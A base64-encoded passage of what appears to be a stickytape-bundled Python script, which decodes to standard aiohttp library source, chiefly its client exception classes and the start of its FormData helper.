5bmMgZGVmIF9fYWVudGVyX18oc2VsZikgLT4gIkNsaWVudFJlc3BvbnNlIjpcclxuICAgICAgICByZXR1cm4gc2VsZlxyXG5cclxuICAgIGFzeW5jIGRlZiBfX2FleGl0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBleGNfdHlwZTogT3B0aW9uYWxbVHlwZVtCYXNlRXhjZXB0aW9uXV0sXHJcbiAgICAgICAgZXhjX3ZhbDogT3B0aW9uYWxbQmFzZUV4Y2VwdGlvbl0sXHJcbiAgICAgICAgZXhjX3RiOiBPcHRpb25hbFtUcmFjZWJhY2tUeXBlXSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAjIHNpbWlsYXIgdG8gX1JlcXVlc3RDb250ZXh0TWFuYWdlciwgd2UgZG8gbm90IG5lZWQgdG8gY2hlY2tcclxuICAgICAgICAjIGZvciBleGNlcHRpb25zLCByZXNwb25zZSBvYmplY3QgY2FuIGNsb3NlIGNvbm5lY3Rpb25cclxuICAgICAgICAjIGlmIHN0YXRlIGlzIGJyb2tlblxyXG4gICAgICAgIHNlbGYucmVsZWFzZSgpXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL2NsaWVudF9leGNlcHRpb25zLnB5JywgYiciIiJIVFRQIHJlbGF0ZWQgZXJyb3JzLiIiIlxyXG5cclxuaW1wb3J0IGFzeW5jaW9cclxuaW1wb3J0IHdhcm5pbmdzXHJcbmZyb20gdHlwaW5nIGltcG9ydCBUWVBFX0NIRUNLSU5HLCBBbnksIE9wdGlvbmFsLCBUdXBsZSwgVW5pb25cclxuXHJcbmZyb20gLmh0dHBfcGFyc2VyIGltcG9ydCBSYXdSZXNwb25zZU1lc3NhZ2VcclxuZnJvbSAudHlwZWRlZnMgaW1wb3J0IExvb3NlSGVhZGVyc1xyXG5cclxudHJ5OlxyXG4gICAgaW1wb3J0IHNzbFxyXG5cclxuICAgIFNTTENvbnRleHQgPSBzc2wuU1NMQ29udGV4dFxyXG5leGNlcHQgSW1wb3J0RXJyb3I6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIHNzbCA9IFNTTENvbnRleHQgPSBOb25lICAjIHR5cGU6IGlnbm9yZVthc3NpZ25tZW50XVxyXG5cclxuXHJcbmlmIFRZUEVfQ0hFQ0tJTkc6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIGZyb20gLmNsaWVudF9yZXFyZXAgaW1wb3J0IENsaWVudFJlc3BvbnNlLCBDb25uZWN0aW9uS2V5LCBGaW5nZXJwcmludCwgUmVxdWVzdEluZm9cclxuZWxzZTpcclxuICAgIFJlcXVlc3RJbmZvID0gQ2xpZW50UmVzcG9uc2UgPSBDb25uZWN0aW9uS2V5ID0gTm9uZVxyXG5cclxuX19hbGxfXyA9IChcclxuICAgICJDbGllbnRFcnJvciIsXHJcbiAgICAiQ2xpZW50Q29ubmVjdGlvbkVycm9yIixcclxuICAgICJDbGllbnRPU0Vycm9yIixcclxuICAgICJDbGllbnRDb25uZWN0b3JFcnJvciIsXHJcbiAgICAiQ2xpZW50UHJveHlDb25uZWN0aW9uRXJyb3IiLFxyXG4gICAgIkNsaWVudFNTTEVycm9yIixcclxuICAgICJDbGllbnRDb25uZWN0b3JTU0xFcnJvciIsXHJcbiAgICAiQ2xpZW50Q29ubmVjdG9yQ2VydGlmaWNhdGVFcnJvciIsXHJcbiAgICAiU2VydmVyQ29ubmVjdGlvbkVycm9yIixcclxuICAgICJTZXJ2ZXJUaW1lb3V0RXJyb3IiLFxyXG4gICAgIlNlcnZlckRpc2Nvbm5lY3RlZEVycm9yIixcclxuICAgICJTZXJ2ZXJGaW5nZXJwcmludE1pc21hdGNoIixcclxuICAgICJDbGllbnRSZXNwb25zZUVycm9yIixcclxuICAgICJDbGllbnRIdHRwUHJveHlFcnJvciIsXHJcbiAgICAiV1NTZXJ2ZXJIYW5kc2hha2VFcnJvciIsXHJcbiAgICAiQ29udGVudFR5cGVFcnJvciIsXHJcbiAgICAiQ2xpZW50UGF5bG9hZEVycm9yIixcclxuICAgICJJbnZhbGlkVVJMIixcclxuKVxyXG5cclxuXHJcbmNsYXNzIENsaWVudEVycm9yKEV4Y2VwdGlvbik6XHJcbiAgICAiIiJCYXNlIGNsYXNzIGZvciBjbGllbnQgY29ubmVjdGlvbiBlcnJvcnMuIiIiXHJcblxyXG5cclxuY2xhc3MgQ2xpZW50UmVzcG9uc2VFcnJvcihDbGllbnRFcnJvcik6XHJcbiAgICAiIiJDb25uZWN0aW9uIGVycm9yIGR1cmluZyByZWFkaW5nIHJlc3BvbnNlLlxyXG5cclxuICAgIHJlcXVlc3RfaW5mbzogaW5zdGFuY2Ugb2YgUmVxdWVzdEluZm9cclxuICAgICIiIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHJlcXVlc3RfaW5mbzogUmVxdWVzdEluZm8sXHJcbiAgICAgICAgaGlzdG9yeTogVHVwbGVbQ2xpZW50UmVzcG9uc2UsIC4uLl0sXHJcbiAgICAgICAgKixcclxuICAgICAgICBjb2RlOiBPcHRpb25hbFtpbnRdID0gTm9uZSxcclxuICAgICAgICBzdGF0dXM6IE9wdGlvbmFsW2ludF0gPSBOb25lLFxyXG4gICAgICAgIG1lc3NhZ2U6IHN0ciA9ICIiLFxyXG4gICAgICAgIGhlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYucmVxdWVzdF9pbmZvID0gcmVxdWVzdF9pbmZvXHJcbiAgICAgICAgaWYgY29kZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgaWYgc3RhdHVzIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiQm90aCBjb2RlIGFuZCBzdGF0dXMgYXJndW1lbnRzIGFyZSBwcm92aWRlZDsgIlxyXG4gICAgICAgICAgICAgICAgICAgICJjb2RlIGlzIGRlcHJlY2F0ZWQsIHVzZSBzdGF0dXMgaW5zdGVhZCJcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgICAgICJjb2RlIGFyZ3VtZW50IGlzIGRlcHJlY2F0ZWQsIHVzZSBzdGF0dXMgaW5zdGVhZCIsXHJcbiAgICAgICAgICAgICAgICBEZXByZWNhdGlvbldhcm5pbmcsXHJcbiAgICAgICAgICAgICAgICBzdGFja2xldmVsPTIsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBpZiBzdGF0dXMgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuc3RhdHVzID0gc3RhdHVzXHJcbiAgICAgICAgZWxpZiBjb2RlIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLnN0YXR1cyA9IGNvZGVcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLnN0YXR1cyA9IDBcclxuICAgICAgICBzZWxmLm1lc3NhZ2UgPSBtZXNzYWdlXHJcbiAgICAgICAgc2VsZi5oZWFkZXJzID0gaGVhZGVyc1xyXG4gICAgICAgIHNlbGYuaGlzdG9yeSA9IGhpc3RvcnlcclxuICAgICAgICBzZWxmLmFyZ3MgPSAocmVxdWVzdF9pbmZvLCBoaXN0b3J5KVxyXG5cclxuICAgIGRlZiBfX3N0cl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gInt9LCBtZXNzYWdlPXshcn0sIHVybD17IXJ9Ii5mb3JtYXQoXHJcbiAgICAgICAgICAgIHNlbGYuc3RhdHVzLFxyXG4gICAgICAgICAgICBzZWxmLm1lc3NhZ2UsXHJcbiAgICAgICAgICAgIHNlbGYucmVxdWVzdF9pbmZvLnJlYWxfdXJsLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIGFyZ3MgPSBmIntzZWxmLnJlcXVlc3RfaW5mbyFyfSwge3NlbGYuaGlzdG9yeSFyfSJcclxuICAgICAgICBpZiBzZWxmLnN0YXR1cyAhPSAwOlxyXG4gICAgICAgICAgICBhcmdzICs9IGYiLCBzdGF0dXM9e3NlbGYuc3RhdHVzIXJ9IlxyXG4gICAgICAgIGlmIHNlbGYubWVzc2FnZSAhPSAiIjpcclxuICAgICAgICAgICAgYXJncyArPSBmIiwgbWVzc2FnZT17c2VsZi5tZXNzYWdlIXJ9IlxyXG4gICAgICAgIGlmIHNlbGYuaGVhZGVycyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgYXJncyArPSBmIiwgaGVhZGVycz17c2VsZi5oZWFkZXJzIXJ9IlxyXG4gICAgICAgIHJldHVybiBmInt0eXBlKHNlbGYpLl9fbmFtZV9ffSh7YXJnc30pIlxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNvZGUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICJjb2RlIHByb3BlcnR5IGlzIGRlcHJlY2F0ZWQsIHVzZSBzdGF0dXMgaW5zdGVhZCIsXHJcbiAgICAgICAgICAgIERlcHJlY2F0aW9uV2FybmluZyxcclxuICAgICAgICAgICAgc3RhY2tsZXZlbD0yLFxyXG4gICAgICAgIClcclxuICAgICAgICByZXR1cm4gc2VsZi5zdGF0dXNcclxuXHJcbiAgICBAY29kZS5zZXR0ZXJcclxuICAgIGRlZiBjb2RlKHNlbGYsIHZhbHVlOiBpbnQpIC0+IE5vbmU6XHJcbiAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgImNvZGUgcHJvcGVydHkgaXMgZGVwcmVjYXRlZCwgdXNlIHN0YXR1cyBpbnN0ZWFkIixcclxuICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxyXG4gICAgICAgICAgICBzdGFja2xldmVsPTIsXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuc3RhdHVzID0gdmFsdWVcclxuXHJcblxyXG5jbGFzcyBDb250ZW50VHlwZUVycm9yKENsaWVudFJlc3BvbnNlRXJyb3IpOlxyXG4gICAgIiIiQ29udGVudFR5cGUgZm91bmQgaXMgbm90IHZhbGlkLiIiIlxyXG5cclxuXHJcbmNsYXNzIFdTU2VydmVySGFuZHNoYWtlRXJyb3IoQ2xpZW50UmVzcG9uc2VFcnJvcik6XHJcbiAgICAiIiJ3ZWJzb2NrZXQgc2VydmVyIGhhbmRzaGFrZSBlcnJvci4iIiJcclxuXHJcblxyXG5jbGFzcyBDbGllbnRIdHRwUHJveHlFcnJvcihDbGllbnRSZXNwb25zZUVycm9yKTpcclxuICAgICIiIkhUVFAgcHJveHkgZXJyb3IuXHJcblxyXG4gICAgUmFpc2VkIGluIDpjbGFzczpgYWlvaHR0cC5jb25uZWN0b3IuVENQQ29ubmVjdG9yYCBpZlxyXG4gICAgcHJveHkgcmVzcG9uZHMgd2l0aCBzdGF0dXMgb3RoZXIgdGhhbiBgYDIwMCBPS2BgXHJcbiAgICBvbiBgYENPTk5FQ1RgYCByZXF1ZXN0LlxyXG4gICAgIiIiXHJcblxyXG5cclxuY2xhc3MgVG9vTWFueVJlZGlyZWN0cyhDbGllbnRSZXNwb25zZUVycm9yKTpcclxuICAgICIiIkNsaWVudCB3YXMgcmVkaXJlY3RlZCB0b28gbWFueSB0aW1lcy4iIiJcclxuXHJcblxyXG5jbGFzcyBDbGllbnRDb25uZWN0aW9uRXJyb3IoQ2xpZW50RXJyb3IpOlxyXG4gICAgIiIiQmFzZSBjbGFzcyBmb3IgY2xpZW50IHNvY2tldCBlcnJvcnMuIiIiXHJcblxyXG5cclxuY2xhc3MgQ2xpZW50T1NFcnJvcihDbGllbnRDb25uZWN0aW9uRXJyb3IsIE9TRXJyb3IpOlxyXG4gICAgIiIiT1NFcnJvciBlcnJvci4iIiJcclxuXHJcblxyXG5jbGFzcyBDbGllbnRDb25uZWN0b3JFcnJvcihDbGllbnRPU0Vycm9yKTpcclxuICAgICIiIkNsaWVudCBjb25uZWN0b3IgZXJyb3IuXHJcblxyXG4gICAgUmFpc2VkIGluIDpjbGFzczpgYWlvaHR0cC5jb25uZWN0b3IuVENQQ29ubmVjdG9yYCBpZlxyXG4gICAgICAgIGNvbm5lY3Rpb24gdG8gcHJveHkgY2FuIG5vdCBiZSBlc3RhYmxpc2hlZC5cclxuICAgICIiIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25uZWN0aW9uX2tleTogQ29ubmVjdGlvbktleSwgb3NfZXJyb3I6IE9TRXJyb3IpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fY29ubl9rZXkgPSBjb25uZWN0aW9uX2tleVxyXG4gICAgICAgIHNlbGYuX29zX2Vycm9yID0gb3NfZXJyb3JcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKG9zX2Vycm9yLmVycm5vLCBvc19lcnJvci5zdHJlcnJvcilcclxuICAgICAgICBzZWxmLmFyZ3MgPSAoY29ubmVjdGlvbl9rZXksIG9zX2Vycm9yKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG9zX2Vycm9yKHNlbGYpIC0+IE9TRXJyb3I6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX29zX2Vycm9yXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgaG9zdChzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvbm5fa2V5Lmhvc3RcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBwb3J0KHNlbGYpIC0+IE9wdGlvbmFsW2ludF06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvbm5fa2V5LnBvcnRcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBzc2woc2VsZikgLT4gVW5pb25bU1NMQ29udGV4dCwgTm9uZSwgYm9vbCwgIkZpbmdlcnByaW50Il06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvbm5fa2V5LnNzbFxyXG5cclxuICAgIGRlZiBfX3N0cl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIkNhbm5vdCBjb25uZWN0IHRvIGhvc3QgezAuaG9zdH06ezAucG9ydH0gc3NsOnsxfSBbezJ9XSIuZm9ybWF0KFxyXG4gICAgICAgICAgICBzZWxmLCBzZWxmLnNzbCBpZiBzZWxmLnNzbCBpcyBub3QgTm9uZSBlbHNlICJkZWZhdWx0Iiwgc2VsZi5zdHJlcnJvclxyXG4gICAgICAgIClcclxuXHJcbiAgICAjIE9TRXJyb3IuX19yZWR1Y2VfXyBkb2VzIHRvbyBtdWNoIGJsYWNrIG1hZ2lja1xyXG4gICAgX19yZWR1Y2VfXyA9IEJhc2VFeGNlcHRpb24uX19yZWR1Y2VfX1xyXG5cclxuXHJcbmNsYXNzIENsaWVudFByb3h5Q29ubmVjdGlvbkVycm9yKENsaWVudENvbm5lY3RvckVycm9yKTpcclxuICAgICIiIlByb3h5IGNvbm5lY3Rpb24gZXJyb3IuXHJcblxyXG4gICAgUmFpc2VkIGluIDpjbGFzczpgYWlvaHR0cC5jb25uZWN0b3IuVENQQ29ubmVjdG9yYCBpZlxyXG4gICAgICAgIGNvbm5lY3Rpb24gdG8gcHJveHkgY2FuIG5vdCBiZSBlc3RhYmxpc2hlZC5cclxuICAgICIiIlxyXG5cclxuXHJcbmNsYXNzIFVuaXhDbGllbnRDb25uZWN0b3JFcnJvcihDbGllbnRDb25uZWN0b3JFcnJvcik6XHJcbiAgICAiIiJVbml4IGNvbm5lY3RvciBlcnJvci5cclxuXHJcbiAgICBSYWlzZWQgaW4gOnB5OmNsYXNzOmBhaW9odHRwLmNvbm5lY3Rvci5Vbml4Q29ubmVjdG9yYFxyXG4gICAgaWYgY29ubmVjdGlvbiB0byB1bml4IHNvY2tldCBjYW4gbm90IGJlIGVzdGFibGlzaGVkLlxyXG4gICAgIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsIHBhdGg6IHN0ciwgY29ubmVjdGlvbl9rZXk6IENvbm5lY3Rpb25LZXksIG9zX2Vycm9yOiBPU0Vycm9yXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fcGF0aCA9IHBhdGhcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKGNvbm5lY3Rpb25fa2V5LCBvc19lcnJvcilcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBwYXRoKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcGF0aFxyXG5cclxuICAgIGRlZiBfX3N0cl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIkNhbm5vdCBjb25uZWN0IHRvIHVuaXggc29ja2V0IHswLnBhdGh9IHNzbDp7MX0gW3syfV0iLmZvcm1hdChcclxuICAgICAgICAgICAgc2VsZiwgc2VsZi5zc2wgaWYgc2VsZi5zc2wgaXMgbm90IE5vbmUgZWxzZSAiZGVmYXVsdCIsIHNlbGYuc3RyZXJyb3JcclxuICAgICAgICApXHJcblxyXG5cclxuY2xhc3MgU2VydmVyQ29ubmVjdGlvbkVycm9yKENsaWVudENvbm5lY3Rpb25FcnJvcik6XHJcbiAgICAiIiJTZXJ2ZXIgY29ubmVjdGlvbiBlcnJvcnMuIiIiXHJcblxyXG5cclxuY2xhc3MgU2VydmVyRGlzY29ubmVjdGVkRXJyb3IoU2VydmVyQ29ubmVjdGlvbkVycm9yKTpcclxuICAgICIiIlNlcnZlciBkaXNjb25uZWN0ZWQuIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIG1lc3NhZ2U6IFVuaW9uW1Jhd1Jlc3BvbnNlTWVzc2FnZSwgc3RyLCBOb25lXSA9IE5vbmUpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbWVzc2FnZSBpcyBOb25lOlxyXG4gICAgICAgICAgICBtZXNzYWdlID0gIlNlcnZlciBkaXNjb25uZWN0ZWQiXHJcblxyXG4gICAgICAgIHNlbGYuYXJncyA9IChtZXNzYWdlLClcclxuICAgICAgICBzZWxmLm1lc3NhZ2UgPSBtZXNzYWdlXHJcblxyXG5cclxuY2xhc3MgU2VydmVyVGltZW91dEVycm9yKFNlcnZlckNvbm5lY3Rpb25FcnJvciwgYXN5bmNpby5UaW1lb3V0RXJyb3IpOlxyXG4gICAgIiIiU2VydmVyIHRpbWVvdXQgZXJyb3IuIiIiXHJcblxyXG5cclxuY2xhc3MgU2VydmVyRmluZ2VycHJpbnRNaXNtYXRjaChTZXJ2ZXJDb25uZWN0aW9uRXJyb3IpOlxyXG4gICAgIiIiU1NMIGNlcnRpZmljYXRlIGRvZXMgbm90IG1hdGNoIGV4cGVjdGVkIGZpbmdlcnByaW50LiIiIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBleHBlY3RlZDogYnl0ZXMsIGdvdDogYnl0ZXMsIGhvc3Q6IHN0ciwgcG9ydDogaW50KSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuZXhwZWN0ZWQgPSBleHBlY3RlZFxyXG4gICAgICAgIHNlbGYuZ290ID0gZ290XHJcbiAgICAgICAgc2VsZi5ob3N0ID0gaG9zdFxyXG4gICAgICAgIHNlbGYucG9ydCA9IHBvcnRcclxuICAgICAgICBzZWxmLmFyZ3MgPSAoZXhwZWN0ZWQsIGdvdCwgaG9zdCwgcG9ydClcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPHt9IGV4cGVjdGVkPXshcn0gZ290PXshcn0gaG9zdD17IXJ9IHBvcnQ9eyFyfT4iLmZvcm1hdChcclxuICAgICAgICAgICAgc2VsZi5fX2NsYXNzX18uX19uYW1lX18sIHNlbGYuZXhwZWN0ZWQsIHNlbGYuZ290LCBzZWxmLmhvc3QsIHNlbGYucG9ydFxyXG4gICAgICAgIClcclxuXHJcblxyXG5jbGFzcyBDbGllbnRQYXlsb2FkRXJyb3IoQ2xpZW50RXJyb3IpOlxyXG4gICAgIiIiUmVzcG9uc2UgcGF5bG9hZCBlcnJvci4iIiJcclxuXHJcblxyXG5jbGFzcyBJbnZhbGlkVVJMKENsaWVudEVycm9yLCBWYWx1ZUVycm9yKTpcclxuICAgICIiIkludmFsaWQgVVJMLlxyXG5cclxuICAgIFVSTCB1c2VkIGZvciBmZXRjaGluZyBpcyBtYWxmb3JtZWQsIGUuZy4gaXQgZG9lc25cJ3QgY29udGFpbnMgaG9zdFxyXG4gICAgcGFydC5cclxuICAgICIiIlxyXG5cclxuICAgICMgRGVyaXZlIGZyb20gVmFsdWVFcnJvciBmb3IgYmFja3dhcmQgY29tcGF0aWJpbGl0eVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB1cmw6IEFueSkgLT4gTm9uZTpcclxuICAgICAgICAjIFRoZSB0eXBlIG9mIHVybCBpcyBub3QgeWFybC5VUkwgYmVjYXVzZSB0aGUgZXhjZXB0aW9uIGNhbiBiZSByYWlzZWRcclxuICAgICAgICAjIG9uIFVSTCh1cmwpIGNhbGxcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKHVybClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB1cmwoc2VsZikgLT4gQW55OlxyXG4gICAgICAgIHJldHVybiBzZWxmLmFyZ3NbMF1cclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiBmIjx7c2VsZi5fX2NsYXNzX18uX19uYW1lX199IHtzZWxmLnVybH0+IlxyXG5cclxuXHJcbmNsYXNzIENsaWVudFNTTEVycm9yKENsaWVudENvbm5lY3RvckVycm9yKTpcclxuICAgICIiIkJhc2UgZXJyb3IgZm9yIHNzbC4qRXJyb3JzLiIiIlxyXG5cclxuXHJcbmlmIHNzbCBpcyBub3QgTm9uZTpcclxuICAgIGNlcnRfZXJyb3JzID0gKHNzbC5DZXJ0aWZpY2F0ZUVycm9yLClcclxuICAgIGNlcnRfZXJyb3JzX2Jhc2VzID0gKFxyXG4gICAgICAgIENsaWVudFNTTEVycm9yLFxyXG4gICAgICAgIHNzbC5DZXJ0aWZpY2F0ZUVycm9yLFxyXG4gICAgKVxyXG5cclxuICAgIHNzbF9lcnJvcnMgPSAoc3NsLlNTTEVycm9yLClcclxuICAgIHNzbF9lcnJvcl9iYXNlcyA9IChDbGllbnRTU0xFcnJvciwgc3NsLlNTTEVycm9yKVxyXG5lbHNlOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBjZXJ0X2Vycm9ycyA9IHR1cGxlKClcclxuICAgIGNlcnRfZXJyb3JzX2Jhc2VzID0gKFxyXG4gICAgICAgIENsaWVudFNTTEVycm9yLFxyXG4gICAgICAgIFZhbHVlRXJyb3IsXHJcbiAgICApXHJcblxyXG4gICAgc3NsX2Vycm9ycyA9IHR1cGxlKClcclxuICAgIHNzbF9lcnJvcl9iYXNlcyA9IChDbGllbnRTU0xFcnJvciwpXHJcblxyXG5cclxuY2xhc3MgQ2xpZW50Q29ubmVjdG9yU1NMRXJyb3IoKnNzbF9lcnJvcl9iYXNlcyk6ICAjIHR5cGU6IGlnbm9yZVttaXNjXVxyXG4gICAgIiIiUmVzcG9uc2Ugc3NsIGVycm9yLiIiIlxyXG5cclxuXHJcbmNsYXNzIENsaWVudENvbm5lY3RvckNlcnRpZmljYXRlRXJyb3IoKmNlcnRfZXJyb3JzX2Jhc2VzKTogICMgdHlwZTogaWdub3JlW21pc2NdXHJcbiAgICAiIiJSZXNwb25zZSBjZXJ0aWZpY2F0ZSBlcnJvci4iIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgY29ubmVjdGlvbl9rZXk6IENvbm5lY3Rpb25LZXksIGNlcnRpZmljYXRlX2Vycm9yOiBFeGNlcHRpb25cclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9jb25uX2tleSA9IGNvbm5lY3Rpb25fa2V5XHJcbiAgICAgICAgc2VsZi5fY2VydGlmaWNhdGVfZXJyb3IgPSBjZXJ0aWZpY2F0ZV9lcnJvclxyXG4gICAgICAgIHNlbGYuYXJncyA9IChjb25uZWN0aW9uX2tleSwgY2VydGlmaWNhdGVfZXJyb3IpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY2VydGlmaWNhdGVfZXJyb3Ioc2VsZikgLT4gRXhjZXB0aW9uOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jZXJ0aWZpY2F0ZV9lcnJvclxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGhvc3Qoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jb25uX2tleS5ob3N0XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcG9ydChzZWxmKSAtPiBPcHRpb25hbFtpbnRdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jb25uX2tleS5wb3J0XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgc3NsKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvbm5fa2V5LmlzX3NzbFxyXG5cclxuICAgIGRlZiBfX3N0cl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICAiQ2Fubm90IGNvbm5lY3QgdG8gaG9zdCB7MC5ob3N0fTp7MC5wb3J0fSBzc2w6ezAuc3NsfSAiXHJcbiAgICAgICAgICAgICJbezAuY2VydGlmaWNhdGVfZXJyb3IuX19jbGFzc19fLl9fbmFtZV9ffTogIlxyXG4gICAgICAgICAgICAiezAuY2VydGlmaWNhdGVfZXJyb3IuYXJnc31dIi5mb3JtYXQoc2VsZilcclxuICAgICAgICApXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL2Zvcm1kYXRhLnB5JywgYidpbXBvcnQgaW9cclxuZnJvbSB0eXBpbmcgaW1wb3J0IEFueSwgSXRlcmFibGUsIExpc3QsIE9wdGlvbmFsXHJcbmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxlbmNvZGVcclxuXHJcbmZyb20gbXVsdGlkaWN0IGltcG9ydCBNdWx0aURpY3QsIE11bHRpRGljdFByb3h5XHJcblxyXG5mcm9tIC4gaW1wb3J0IGhkcnMsIG11bHRpcGFydCwgcGF5bG9hZFxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBndWVzc19maWxlbmFtZVxyXG5mcm9tIC5wYXlsb2FkIGltcG9ydCBQYXlsb2FkXHJcblxyXG5fX2FsbF9fID0gKCJGb3JtRGF0YSIsKVxyXG5cclxuXHJcbmNsYXNzIEZvcm1EYXRhOlxyXG4gICAgIiIiSGVscGVyIGNsYXNzIGZvciBmb3JtIGJvZHkgZ2VuZXJhdGlvbi5cclxuXHJcbiAgICBTdXBwb3J0cyBtdWx0aXBhcnQvZm9ybS1kYXRhIGFuZCBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQuXHJcbiAgICAiIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBmaWVsZHM6IEl0ZXJhYmxlW0FueV0gPSAoKSxcclxuICAgICAgICBxdW90ZV9maWVsZHM6IGJvb2wgPSBUcnVlLFxyXG4gICAgICAgIGNoYXJzZXQ6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX3dyaXRlciA9IG11bHRpcGFydC5NdWx0aXBhcnRXcml0ZXIoImZvcm0tZGF0YSIpXHJcbiAgICAgICAgc2VsZi5fZmllbGRzID0gW10gICMgdHlwZTogTGlzdFtBbnldXHJcbiAgICAgICAgc2VsZi5faXNfbXVsdGlwYXJ0ID0gRmFsc2VcclxuICAgICAgICBzZWxmLl9pc19wcm9jZXNzZWQgPSBGYWxzZVxyXG4gICAgICAgIHNlbGYuX3F1b3RlX2ZpZWxkcyA9IHF1b3RlX2ZpZWxkc1xyXG4gICAgICAgIHNlbGYuX2NoYXJzZXQgPSBjaGFyc2V0XHJcblxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2UoZmllbGRzLCBkaWN0KTpcclxuICAgICAgICAgICAgZmllbGRzID0gbGlzdChmaWVsZHMuaXRlbXMoKSlcclxuICAgICAgICBlbGlmIG5vdCBpc2luc3RhbmNlKGZpZWxkcywgKGxpc3QsIHR1cGxlKSk6XHJcbiAgICAgICAgICAgIGZpZWxkcyA9IChmaWVsZHMsKVxyXG4gICAgICAgIHNlbGYuYWRkX2ZpZWxkcygqZmllbGRzKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGlzX211bHRpcGFydChzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9pc19tdWx0aXBhcnRcclxuXHJcbiAgICBkZWYgYWRkX2ZpZWxkKFxyXG4gICAgICAgIHNlbGYsXHJcbiA